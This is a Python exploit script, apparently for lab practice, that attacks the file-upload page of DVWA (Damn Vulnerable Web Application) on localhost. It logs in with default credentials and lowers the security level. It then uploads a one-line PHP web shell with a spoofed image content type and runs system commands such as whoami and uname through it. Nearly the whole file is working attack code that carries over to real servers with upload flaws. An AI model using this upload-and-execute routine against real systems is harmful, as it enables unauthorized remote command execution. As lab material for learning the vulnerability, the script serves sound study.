#!/usr/bin/env python3
"""
File Upload Exploitation Script for DVWA
Author: Daniel Oyanogbezina
Purpose: Educational demonstration of file upload vulnerabilities
"""

import requests
import sys

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore:
        CYAN = YELLOW = GREEN = RED = MAGENTA = WHITE = ""
    class Style:
        RESET_ALL = ""

TARGET_URL = "http://localhost/vulnerabilities/upload/"
LOGIN_URL = "http://localhost/login.php"
SECURITY_URL = "http://localhost/security.php"
SHELL_URL = "http://localhost/hackable/uploads/"

def print_banner():
    banner = f"""
{Fore.CYAN}{'='*70}
    File Upload Exploitation Tool - DVWA
    Educational Purpose Only
{'='*70}{Style.RESET_ALL}
    """
    print(banner)

def get_authenticated_session():
    """Login to DVWA"""
    print(f"{Fore.YELLOW}[*] Logging into DVWA...{Style.RESET_ALL}")
    session = requests.Session()
    
    try:
        response = session.get(LOGIN_URL)
        login_data = {
            'username': 'admin',
            'password': 'password',
            'Login': 'Login'
        }
        session.post(LOGIN_URL, data=login_data)
        session.get(f"{SECURITY_URL}?security=low&seclev_submit=Submit")
        print(f"{Fore.GREEN}[+] Logged in successfully{Style.RESET_ALL}")
        return session
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        return None

def upload_shell(session, filename, content):
    """Upload web shell"""
    print(f"\n{Fore.CYAN}[*] Uploading: {filename}{Style.RESET_ALL}")
    
    files = {'uploaded': (filename, content, 'image/jpeg')}
    data = {'Upload': 'Upload'}
    
    try:
        response = session.post(TARGET_URL, files=files, data=data)
        
        if 'successfully uploaded' in response.text:
            print(f"{Fore.GREEN}[+] Upload successful!{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[-] Upload failed{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        return False

def execute_command(session, shell_name, command):
    """Execute command via uploaded shell"""
    print(f"\n{Fore.CYAN}[*] Executing: {command}{Style.RESET_ALL}")
    
    try:
        url = f"{SHELL_URL}{shell_name}?cmd={command}"
        response = session.get(url)
        
        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] Output:{Style.RESET_ALL}")
            print(f"{Fore.WHITE}{response.text}{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[-] Failed to execute{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        return False

def main():
    print_banner()
    
    session = get_authenticated_session()
    if not session:
        print(f"{Fore.RED}[!] Failed to authenticate{Style.RESET_ALL}")
        sys.exit(1)
    
    # Create simple web shell
    shell_code = '<?php system($_REQUEST["cmd"]); ?>'
    shell_name = 'auto-shell.php'
    
    # Upload shell
    if upload_shell(session, shell_name, shell_code):
        print(f"\n{Fore.MAGENTA}{'='*70}")
        print(f"Web Shell Uploaded Successfully!")
        print(f"{'='*70}{Style.RESET_ALL}")
        
        # Test commands
        commands = ['whoami', 'pwd', 'id', 'uname -a']
        
        for cmd in commands:
            execute_command(session, shell_name, cmd)
    
    print(f"\n{Fore.RED}[!] Educational purposes only{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted{Style.RESET_ALL}")
        sys.exit(0)
